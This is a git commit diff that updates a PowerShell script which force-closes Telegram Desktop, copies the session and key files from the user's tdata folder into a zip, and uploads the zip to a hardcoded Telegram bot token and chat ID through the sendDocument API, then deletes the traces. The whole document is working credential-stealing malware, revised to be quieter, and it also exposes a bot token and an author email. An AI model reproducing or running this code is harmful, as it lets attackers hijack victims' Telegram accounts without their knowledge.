0e063f206a2791de4dc5939a6b87258c6a4f7227
Mirzobek <usmirzo51@gmail.com>
2026-04-01 19:21:05 +0500

    Update script.ps1

--- tdata/script.ps1
+++ tdata/script.ps1
@@ -1,28 +1,19 @@
 $token = "8649684929:AAGUPmSFkh3tLV6OkveTTX3nuIc4rCNjs_A"
-$chatId = "6190772023"
-
-$user = $env:USERNAME
+$chatId = "7068280080"
 $tdata = "$env:APPDATA\Telegram Desktop\tdata"
-$zip = "$env:TEMP\tdata_$user.zip"
+$zip = "$env:TEMP\s.zip"
+$tmp = "$env:TEMP\t_dir"
 
-Stop-Process -Name "Telegram" -Force -ErrorAction SilentlyContinue
-
+taskkill /F /IM Telegram.exe /T 2>$null
 if (Test-Path $tdata) {
-    try {
-        if (Test-Path $zip) { Remove-Item $zip -Force }
-        
-        Add-Type -A System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($tdata, $zip)
-        
-        $url = "https://api.telegram.org/bot$token/sendDocument"
-        $postData = @{ chat_id = $chatId; document = Get-Item $zip }
-        Invoke-RestMethod -Uri $url -Method Post -Form $postData
-        
-        Remove-Item $zip -Force
-        Write-Host "Tayyor! Botni tekshir."
-    } catch {
-        Write-Host "Xatolik: $_"
-    }
-} else {
-    Write-Host "tdata topilmadi!"
+    if (Test-Path $zip) { Remove-Item $zip -Force }
+    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force }
+    $null = New-Item -ItemType Directory -Path $tmp -Force
+    Copy-Item "$tdata\key_datas" -Destination $tmp
+    Copy-Item "$tdata\D877F783D5D3EF8C*" -Destination $tmp
+    Copy-Item "$tdata\map*" -Destination $tmp
+    Add-Type -A System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($tmp, $zip)
+    curl.exe -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zip"
+    Remove-Item $zip, $tmp -Recurse -Force
 }
